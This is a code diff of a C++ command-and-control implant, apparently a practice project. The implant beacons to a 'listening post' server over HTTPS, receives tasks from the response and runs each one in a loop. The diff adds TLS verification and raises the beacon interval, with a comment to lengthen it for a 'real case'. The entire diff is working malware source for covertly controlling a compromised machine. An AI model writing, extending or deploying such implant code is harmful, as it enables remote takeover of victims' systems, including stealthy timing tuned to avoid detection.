@@ -31,29 +31,23 @@ using json = nlohmann::json;
     auto const httpVersion = 11;
     auto const requestBody = json::parse(payload);
 
-    //construct listening post endpoint URL, only HTTp
+    //construct listening post endpoint URL
     std::stringstream ss;
     ss << "https://" << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
-
+    cpr::SslOptions sslOpts = cpr::Ssl(
+        cpr::ssl::VerifyHost{ true },
+        cpr::ssl::VerifyPeer{ true },
+        cpr::ssl::CaInfo{ "cert.pem" }
+    );
 
     cpr::AsyncResponse asyncRequest = cpr::PostAsync(
         cpr::Url{ fullServerUrl },
         cpr::Body{ requestBody.dump() },
         cpr::Header{ {"Content-Type", "application/json"} },
-        cpr::ssl::VerifyHost{ true },       // verify server hostname
-        cpr::ssl::VerifyPeer{ true },       // verify server certificate
-        cpr::CertInfo{ "cert.pem" }  // path to CA cert bundle
+        sslOpts
     );
-
-
-
-    // //make an async HTTP POST req. to listening post
-    // cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
-    //     cpr::Body{ requestBody.dump() },
-    //     cpr::Header{ {"Content-Type", "application/json"} }
-    // );
 
     //retrieve response
     cpr::Response response = asyncRequest.get();
@@ -61,7 +55,7 @@ using json = nlohmann::json;
     //show request contents
     std::cout << "Request body: " << requestBody << std::endl;
 
-    //return body of the response from listening post, may include new tasks
+    //return body of the response from listening post, THIS IS WHERE NEW TASKS ARE RECEIVED
     return response.text;
 
 };
@@ -110,7 +104,7 @@ void Implant::parseTasks(const std::string& response) {
 }
 
 
-//loop and go thru takss from listening post, service them
+//loop and go thru taks from listening post, service them
 void Implant::serviceTasks() {
     while (isRunning) {
         std::vector<Task> localTasks;
@@ -120,7 +114,7 @@ void Implant::serviceTasks() {
         }
 
         for (const auto& task: localTasks) {
-            //call run() and each task
+            //call run() on each task
             const auto [id, contents, success] = std::visit([](const auto& task) {return task.run(); }, task);
 
             {
@@ -168,9 +162,7 @@ Implant::Implant(std::string host, std::string port, std::string uri) :
     uri{ std::move(uri) },
 
     isRunning{ true },
-    dwellDistributionSeconds{ 1. }
-
-    // taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } 
+    dwellDistributionSeconds{ 10. } //make this longer for real case (~ >200)
 {
 }
 
